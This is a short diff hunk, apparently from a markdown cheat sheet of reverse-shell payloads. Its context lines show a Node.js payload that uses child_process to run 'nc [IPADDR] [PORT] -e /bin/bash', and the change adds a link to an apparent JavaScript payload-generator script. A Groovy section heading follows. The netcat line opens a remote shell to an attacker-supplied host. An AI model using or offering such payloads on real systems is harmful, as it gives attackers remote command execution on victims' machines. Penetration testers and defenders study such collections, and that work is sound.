@@ -153,6 +153,10 @@ or
 
 -var x = global.process.mainModule.require
 -x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')
+
+or
+
+https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
 
 ### Groovy - by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
